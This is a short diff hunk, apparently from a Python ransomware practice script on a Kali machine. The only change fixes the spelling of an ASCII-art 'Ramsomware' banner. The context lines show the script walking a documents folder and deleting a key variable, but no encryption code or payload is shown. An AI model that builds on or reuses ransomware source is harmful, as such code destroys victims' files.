@@ -37,7 +37,7 @@ for path,dirs,files in os.walk("/home/kali/Documents/Important/"):
 del key
 del fn
 
-banner = pyfiglet.figlet_format("Randsomware !!")
+banner = pyfiglet.figlet_format("Ramsomware !!")
 
 print(banner)
 
